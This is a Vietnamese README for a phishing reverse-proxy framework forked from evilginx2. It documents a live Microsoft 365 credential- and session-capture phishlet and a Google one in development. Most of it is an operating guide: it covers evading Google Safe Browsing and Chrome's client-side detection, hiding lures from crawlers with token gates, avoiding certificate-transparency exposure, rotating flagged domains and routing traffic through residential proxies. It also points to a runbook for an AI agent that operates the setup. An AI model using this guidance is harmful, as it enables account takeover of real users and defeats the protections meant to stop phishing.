# fake-evilginx-pro

> 🌐 **Tiếng Việt** | [English](README.md)

**Máy chủ phishing reverse-proxy đầy đủ tính năng cho red team có ủy quyền — fork mở rộng của [evilginx2 CE 3.3.0](https://github.com/kgretzky/evilginx2) (GPL-3.0), hiện thực clean-room các tính năng của Evilginx Pro cho môi trường nội bộ/offline.**

> ⚠️ **Giấy phép & phạm vi**: Dành cho bài học và chiến dịch red team được ủy quyền bởi chính chủ sở hữu hệ thống. Không liên kết với BreakDev/Evilginx Pro — không dùng binary/code của sản phẩm thương mại; mọi tính năng được viết lại từ đầu dựa trên mã nguồn GPL và mô tả công khai. Tuân thủ GPL-3.0 của upstream (xem `LICENSE`, ghi công Kuba Gretzky).

**Trạng thái triển khai** (chi tiết: [`deploy/README.md`](deploy/README.md), runbook agent: `.zcode/skills/deploying-and-operating-fake-evilginx-pro/SKILL.md`; hostname/IP/node được giữ trong docs nội bộ, không public):

> ℹ️ File phishlet (`src/phishlets/*.yaml`) **gitignore theo thiết kế** — repo công khai không
> bao giờ ship phishlet campaign; phishlet được đặt trực tiếp lên node. Bảng dưới chỉ theo
> dõi trạng thái phát triển.

| Phishlet | Trạng thái | Tính năng đã áp |
|----------|-----------|-----------------|
| `ms365` | ✅ **đóng — production-ready** (verify thực chiến) | work + consumer capture, mailbox reuse, token-gate, CSD hardening (SB bypass verified), JA4 allowlist |
| `google` | 🔄 **đang phát triển** | CSD hardening đã port, enabled trên base live, lure gated đã tạo; upstream residential proxy cấu hình xong với per-target routing; còn iterate credentials theo POST thật của luồng v3 |

---

## Tính năng (parity so với Evilginx Pro)

| # | Tính năng | Trạng thái | Cách dùng |
|---|-----------|-----------|-----------|
| 1 | **Client-Server fleet** | ✅ | REST API mTLS + `tools/egctl.py` điều khiển nhiều server từ 1 PC |
| 2 | **API ẩn + client-cert** | ✅ | `-api <port>` — stealth base path random, client cert tự sinh |
| 3 | **Wildcard cert / tránh CT logs** | ✅ (offline) | `tools/mint_internal_cert.sh` — internal CA, zero egress |
| 4 | **Botguard (chống bot/scanner)** | ✅ | `-botguard` — TLS GREASE + header + JS telemetry → trang decoy |
| 5 | **Evilpuppet (browser telemetry)** | 🟡 code ships | `puppet/` sidecar chromedp + API `/pp/cookies`; e2e chờ fix DNS chromium (xem `docs/EVILPUPPET.md`) |
| 6 | **Phishlet authoring kit** | ✅ | `tools/make_phishlet.py` + redirector templates |
| 7 | **Quản lý DNS** | ✅ (offline) | `tools/make_dns_zone.py` — dnsmasq zone nội bộ thay API Cloudflare |
| 8 | **Multi-domain** | ✅ | mỗi phishlet một domain riêng, cookie theo domain phishlet |
| 9 | **JS obfuscation** | ✅ | `-jsobf off/low/medium/high/ultra` — string-array + rotation, mỗi response một biến thể |
| 10 | **rewrite_urls** | ✅ | `rewrite_urls: [{from, to, query_map, drop}]` — path+query rewrite hai chiều |
| 11 | **AES-256 lure params** | ✅ | mặc định — key server-side, không còn RC4-key-trong-URL |
| 12 | **Gophish / webhook creds** | ✅ | `-webhook <URL nội bộ>` — JSON + password_sha256 + rid campaign tracking |
| 13 | **Auto-deploy** | ✅ (offline) | `tools/deploy_offline.sh` — SSH deploy + systemd trên host nội bộ |
| 14 | **SQLite storage** | ✅ | thay buntDB — modernc.org/sqlite pure-Go, WAL |
| 15 | **Lure token-gate** | ✅ | lure có `token` (`"auto"` khi tạo qua API): thiếu `?t=<token>` → 302 ra URL benign, **Safe Browsing/crawler không bao giờ render trang login** để classify — kéo dài tuổi thọ domain |
| 16 | **CSD hardening (chống phát hiện phía client)** | ✅ đã verify | js_inject trong phishlet: (1) `input[type=password]` **không bao giờ tồn tại trong DOM** (swap `type=text` + `-webkit-text-security`, MutationObserver chống re-render, giá trị submit không đổi) + (2) brand lazy-reveal (logo/thương hiệu ẩn lúc load, hiện sau gesture đầu tiên) — Chrome CSPD/on-device AI không còn đặc trưng để classify. **Verify thực chiến 2026-09-11: Chrome SB bật, full flow, không flag Dangerous** |
| 17 | **Upstream proxy + per-target routing** | ✅ | proxy SOCKS5/HTTP(s) + auth cho upstream. **Routes theo suffix domain**: chỉ domain liệt kê đi qua proxy (vd `google.com,gstatic.com,googleusercontent.com` → residential), còn lại direct (vd MS365 giữ IP node) — không đốt băng thông residential, tránh Entra ID risk-flag residential ASN cho account work. Quản trị: `proxy` console/API, hot-apply không restart, password masked trong status |

Chi tiết + bằng chứng verify từng tính năng: [`docs/FEATURES.md`](docs/FEATURES.md).

## Kiến trúc

```
┌────────────── Operator PC (Windows) ──────────────────────────────────────┐
│  tools/egconsole.py (REPL: fleet API + lure token-gate + export + open    │
│  browser signed-in + tail SSH + puppet)  ·  tools/egctl.py  ·  session_launcher.py │
└───────────────┬──────────────────────────────────────────┬────────────────┘
                │ REST mTLS :9443 (stealth base path)      │ SSH
        ┌───────▼──────── SERVER NODE (VPS internet-facing) ▼──────────────┐
        │ evilginx2 (fake-evilginx-pro)                                    │
        │  :443  MITM reverse-proxy  ← wildcard cert *.<BASE>.<ZONE>       │
        │        (DNS-01, không per-host cert → không lộ CT logs)          │
        │        botguard JA4 + UA + telemetry decoy · lure token-gate     │
        │  :9443 REST API mTLS (fleet + puppet push)                       │
        │  SQLite ~/.evilginx/data.db (sessions + cookies persist)         │
        │  puppet/ evilpuppet-lite (chromedp headless, auto-login + MFA)   │
        │  [optional] upstream residential proxy → config.json `proxy`     │
        └───────────────┬──────────────────────────────────────────────────┘
                        │ reverse-proxy (auto_filter + sub_filters 2 chiều)
                        ▼
                 Origin thật (login.microsoftonline.com / accounts.google.com …)
```

Lớp chống-liên-kết-với-campaign (anti-burn):

1. **Wildcard DNS-01 duy nhất** — CT logs chỉ thấy `*.<BASE>.<ZONE>`, không hostname nào để liệt kê
2. **Lure token-gate** — crawler/Safe Browsing vào lure thiếu `?t=` chỉ thấy 302 benign,
   không bao giờ render login để classify
3. **Botguard** — JA4 allowlist + UA blocklist + telemetry probe → scanner nhận decoy
4. **Rotate domain** khi bị flag — chạy lại runbook domain mới (~15 phút, xem mục trên)

## Quickstart

### Build (không cần internet — vendor tree đi kèm)

```bash
cd src
go build -mod=vendor -o evilginx2 .          # server chính
go build -mod=vendor -o evilpuppet-lite ./puppet   # sidecar (tùy chọn)
```

### Chạy lab nhanh (1 máy, không cần domain thật)

```bash
# 1) DNS cục bộ (lab .test domains)
echo "127.0.0.1 www.labphish.test"  | sudo tee -a /etc/hosts
echo "127.0.0.2 portal.labsvc.test" | sudo tee -a /etc/hosts

# 2) origin mô phỏng (test site tự dựng)
python3 tools/lab/testsite.py &        # HTTPS login trên 127.0.0.2:443 (cert tự sinh)
python3 tools/lab/webhook_rx.py &      # receiver :9090 ghi creds nhận được

# 3) server với đầy đủ flags
./evilginx2 -p ./phishlets -developer \
   -api 9443 -botguard -bg-ua=false -bg-grace 6 \
   -jsobf ultra -webhook http://127.0.0.1:9090/capture
```

Console lệnh cơ bản (một lần đầu):

```
config domain labphish.test
config ipv4 external <IP> ; config ipv4 bind <IP>
phishlets hostname lab labphish.test
phishlets enable lab
lures create lab
lures get-url 0 victim=a@corp.local rid=cmp-1
```

### Điều khiển từ PC cá nhân (fleet)

```bash
cp tools/servers.example.json my-servers.json   # sửa host/port/cert paths
python3 tools/egctl.py my-servers.json status
python3 tools/egctl.py my-servers.json phishlets
python3 tools/egctl.py my-servers.json enable lab
python3 tools/egctl.py my-servers.json lure-url lab 0 rid=cmp-1
python3 tools/egctl.py my-servers.json sessions
```

Client certs do server tự sinh trong `~/.evilginx/api/` (`ca.crt`, `client.crt`, `client.key`) — copy về PC và ghi vào `my-servers.json`.

## Domain mới cho campaign (VPS internet-facing)

Domain cũ bị Google Safe Browsing flag ("Dangerous" trong Chrome) là **poisoned vĩnh viễn**
trong hệ của Google — xin review/xin subdomain mới/cert mới đều không mở được flag khi vẫn
host nội dung phishing. Cách duy nhất: **domain mới + wildcard DNS-01 từ đầu + lure
token-gate**. Toàn bộ quy trình ~15 phút.

### 1. Chọn domain

- Ưu tiên domain **đã đăng ký ≥1 năm** (aged, có lịch sử sạch) — domain brand-new bị Google
  ưu tiên crawl/chấm điểm nghi hơn
- Tên trung tính kiểu SaaS/cổng IT phục vụ bối cảnh lure (`portal-*`, `*-cloud`, `myapps-*`…);
  **tránh** brand ngân hàng/tổ chức thật và chuỗi gợi ý rõ (`login-secure-…`) — dễ bị report
- TLD phổ biến (.com/.net/.org); mua ở registrar bất kỳ, **không cần ẩn thông tin thêm**
- Định kỳ khi domain bị flag: đăng ký domain kế tiếp, rotate bằng đúng quy trình này

### 2. Tạo Cloudflare zone cho domain

1. Đăng nhập [dash.cloudflare.com](https://dash.cloudflare.com) → **Add a domain** → nhập
   domain mới → gói **Free**
2. Cloudflare cấp **2 nameserver** (dạng `xxx.ns.cloudflare.com`) — vào trang registrar,
   đổi nameserver của domain sang 2 địa chỉ này
3. Chờ zone **Active** (dashboard + email, thường 5–30 phút)
4. Tạo đúng **1 bản ghi wildcard** (DNS → Records → Add record):
   - Type `A` · Name `*.auth2` (tức `*.<BASE>`) · IPv4 `<IP VPS>` · **Proxy status: DNS only**
     (mây xám — BẮT BUỘC; mây cam/proxy sẽ terminate TLS thay VPS và phá flow)
   - **Không** tạo bản ghi bare `@`, không tạo per-host — chỉ wildcard (giảm CT/crawler surface)

### 3. Tạo Cloudflare API token (quyền DNS Edit)

1. Góc phải trên → avatar → **My Profile** → **API Tokens** → **Create Token**
2. Chọn **Create Custom Token**:
   - **Permissions**: `Zone` → `DNS` → `Edit`
   - **Zone Resources**: `Include` → `Specific zone` → chọn domain mới
   - (khuyến nghị) **Client IP Filtering**: giới hạn IP VPS nếu VPS cố định
   - TTL ngắn nếu chỉ dùng 1 lần
3. **Continue to summary → Create Token** — token hiển thị **đúng 1 lần**, copy ngay
4. Verify token (trên VPS hoặc máy-local):
   ```bash
   curl -s -H "Authorization: Bearer <TOKEN>" \
     https://api.cloudflare.com/client/v4/user/tokens/verify | jq .
   ```
   Expect: `"status": "active"`. Token KHÔNG bao giờ commit vào repo — chỉ truyền qua env.

### 4. Dựng cert + bật phishlet (trên VPS)

```bash
cd ~/fake-evilginx-pro/deploy        # node hiện có: script nằm trong thư mục deploy đã scp
BASE=auth2 ZONE=<domain-mới> CF_TOKEN='<token>' ./wildcard-cert-setup.sh
```

Script tự làm: issue wildcard `*.<BASE>.<ZONE>` qua DNS-01 → cài vào
`~/.evilginx/crt/sites/wildcard-<BASE>/` → **autocert OFF vĩnh viễn** → set hostname phishlet
→ cron renew (renew xong tự restart). Kiểm tra dòng cuối in ra lure URL mẫu.

5. Trên console evilginx (hoặc `tools/egconsole.py` từ PC):
   ```
   phishlets hostname ms365 <BASE>.<ZONE>
   phishlets enable ms365
   ```
6. Tạo lure **token-gated** qua API (token `"auto"` = sinh ngẫu nhiên):
   ```bash
   curl -sk --cert ~/.evilginx/api/client.crt --key ~/.evilginx/api/client.key \
     -X POST -H "Content-Type: application/json" \
     -d '{"phishlet":"ms365","path":"","redirect_url":"https://www.office.com","token":"auto"}' \
     "https://127.0.0.1:9443/api-<path>/lures"
   # → {"id":N,"path":"/XXXXXXXX","token":"<16-ký-tự>"}
   ```
   **URL phát campaign**: `https://<landing>.<BASE>.<ZONE>/XXXXXXXX?t=<token>`
   — thiếu `?t=` (crawler, Safe Browsing, link preview) chỉ thấy 302 sang `redirect_url`
   benign, không bao giờ chạm trang login. Test cả 2 nhánh trước khi phát:
   ```bash
   curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://<lure-url>"          # → 302 benign
   curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://<lure-url>?t=<token>" # → vào flow
   ```

### 5. Checklist go-live

- [ ] **Kiểm tra pre-flag TRƯỚC khi trỏ domain về server**: ngay sau khi đăng ký, mở domain
      (trang parking của registrar) trong Chrome — nếu badge "Dangerous"/"Not secure" hiện sẵn
      thì domain đã bị flag từ trước (abuse cũ) → **bỏ, đăng ký tên khác**. Đồng thời tránh
      tên chứa brand nổi tiếng: brand trong tên làm mọi classifier (client-side SB, SmartScreen,
      **Cisco Talos/Umbrella**, báo cáo thủ công) chấm điểm nghi nhanh hơn nhiều.
- [ ] **Kiểm tra Talos/Umbrella category trước khi dùng** (lớp SWG công ty — cái mà infra
      KHÔNG bypass được): mở [talosintelligence.com/reputation](https://www.talosintelligence.com/reputation)
      → nhập domain → category phải lành mạnh (vd Business/Technology), KHÔNG là
      "Newly Seen/Registered" + không threat. Domain mới đăng ký gần như chắc chắn dính NSD —
      waitFor age hoặc mua domain **aged sạch** (aftermarket). Dispute/recategorization
      (form công khai của Cisco) CHỈ dùng cho domain thực sự lành mạnh (decoy/redirect),
      không dùng cho domain đang chạy phishlet.
- [ ] TLS handshake OK trên landing host (curl 200/302, cert wildcard Let's Encrypt)
- [ ] Lure không token → 302 benign; đủ token → vào login flow
- [ ] `config.json`: `autocert: false` — **không bao giờ bật lại** trên node internet-facing
- [ ] Systemd unit KHÔNG có `-jsobf ultra`, KHÔNG có `-debug`
- [ ] `-bg-trusted` chứa IP operator/VPS; `-bg-ja4 t13d15` cho Chrome desktop
- [ ] Test bằng curl/browser tắt Safe Browsing — **không test lure bằng Chrome thật có SB** —
      đã chứng minh (2026-09-11, node live): Chrome SB phát hiện phishing **phía client**
      ngay khi render trang password (giao diện MS trên domain lạ) và tự báo URL về Google →
      subdomain đó bị flag trong vài phút, dù crawler không từng vào node. Khi test flow,
      tắt SB trong browser test (chrome://settings/security). Ngoại lệ: test SB-bật cố ý
      để VALIDATE CSD hardening — làm trên host password (vốn sacrificial, rotate 1 dòng)
- [ ] Phishlet chung 1 base: không trùng `phish_sub` giữa các phishlet enabled
- [ ] Google target: residential upstream proxy trong `config.json` (mục `proxy`)

## Flag reference

| Flag | Mặc định | Ý nghĩa |
|------|----------|---------|
| `-p DIR` | — | thư mục phishlets |
| `-developer` | off | tự ký cert mọi hostname (không ACME — chạy offline) |
| `-api PORT` | off | bật REST API mTLS (stealth path lưu `~/.evilginx/api/config.json`) |
| `-botguard` | off | bật Botguard (GREASE + headers + JS telemetry) |
| `-bg-grace N` | 8 | giây grace trước khi gate session chưa verify |
| `-bg-ua` | true | lớp UA-blocklist (tắt khi chạy puppet headless) |
| `-bg-ja4` | — | allowlist prefix JA4, phân tách bằng phẩy (vd `t13d15,t12d`) |
| `-bg-trusted` | — | CIDR bỏ qua scoring botguard (IP operator/VPS nội bộ, vd `127.0.0.1/32,<VPS_IP>/32`) |
| `-bg-det-cidrs` | — | CIDR "detonator" — session từ các IP này bị decoy vĩnh viễn |
| `-no-watch` | off | tắt auto-reload phishlet |
| `-jsobf LVL` | off | obfuscate js_inject: off/low/medium/high/ultra |
| `-webhook URL` | off | push JSON creds khi session hoàn tất |
| `-c DIR` | `~/.evilginx` | thư mục config |

## Cấu trúc thư mục

```
fake-evilginx-pro/
├── README.md                # file này (EN) · README.vi.md (bản tiếng Việt)
├── CHANGELOG.md             # lịch sử v0.1 → v0.9.1
├── LICENSE                  # GPL-3.0 (upstream)
├── src/                     # mã nguồn fork (Go, vendor kèm sẵn)
│   ├── core/                # + lurecrypto, apid, botguard, rewrite, jsobf, webhook
│   ├── puppet/              # evilpuppet-lite sidecar (chromedp)
│   ├── database/            # SQLite layer
│   └── redirectors/         # templates (interstitial, download, ...)
├── tools/
│   ├── egconsole.py         # console REPL operator: fleet API + lures (token-gate) + export + open + tail SSH + puppet
│   ├── my-servers.example.json / my-servers.json  # fleet config cho egconsole/egctl
│   ├── console.json         # SSH config cho lệnh tail/puppet của egconsole
│   ├── egctl.py             # client fleet đa server
│   ├── make_phishlet.py     # generator phishlet + lint
│   ├── mint_internal_cert.sh# internal CA + cert
│   ├── deploy_offline.sh    # auto-deploy host nội bộ (systemd)
│   ├── make_dns_zone.py     # dnsmasq zone generator
│   ├── ja3.py               # JA3 calculator (tshark pipe)
│   ├── lab/                 # test site + webhook receiver + verifiers
│   └── patches/             # patch scripts tái áp lên upstream mới
├── examples/phishlets/      # lab.yaml (rewrite_urls + js_inject mẫu), lab2.yaml
└── docs/                    # FEATURES, OFFLINE_OPS, BLUE_TEAM_IOC, EVILPUPPET, LAB_SETUP
```

## Tài liệu

- [`deploy/README.md`](deploy/README.md) — **trạng thái live của node VPS + unit chuẩn + quy tắc vận hành**
- `.zcode/skills/deploying-and-operating-fake-evilginx-pro/SKILL.md` — runbook AI agent (gotchas đã chứng minh + troubleshooting map)
- [`docs/FEATURES.md`](docs/FEATURES.md) — ma trận parity + bằng chứng verify
- [`docs/OFFLINE_OPS.md`](docs/OFFLINE_OPS.md) — chạy zero-egress: audit, containment, checklist
- [`docs/EVILPUPPET.md`](docs/EVILPUPPET.md) — thiết kế + trạng thái sidecar browser
- [`docs/BLUE_TEAM_IOC.md`](docs/BLUE_TEAM_IOC.md) — góc nhìn phòng thủ (IOC của lớp công nghệ này)
- [`docs/LAB_SETUP.md`](docs/LAB_SETUP.md) — dựng lại lab e2e từng bước (kèm gotchas)

## Roadmap

- [x] ~~phishlet hot-reload~~ (v0.10: console/API/auto-watch — thêm/sửa/xóa phishlet không cần restart)
- [x] ~~JA4 cho Botguard~~ (v0.10; h2 Akamai fingerprint còn lại)
- [x] ~~writer-API lure edit/delete~~ (apid.go: GET/PUT/DELETE `/lures/{id}`)
- [x] ~~lure token-gate chống Safe Browsing~~ (X-Eg-Gate redirect benign, 2026-09-10)
- [x] ~~CSD hardening chống phát hiện phía client~~ (2026-09-11 **verify thực chiến: SB bật, không flag**)
- [ ] evilpuppet e2e (fix chromium DNS qua dnsmasq zone nội bộ)
- [ ] JA4 + HTTP/2 Akamai fingerprint cho Botguard
- [ ] Google phishlet hoàn thiện (chờ residential upstream proxy — Google chặn sign-in từ IP datacenter)
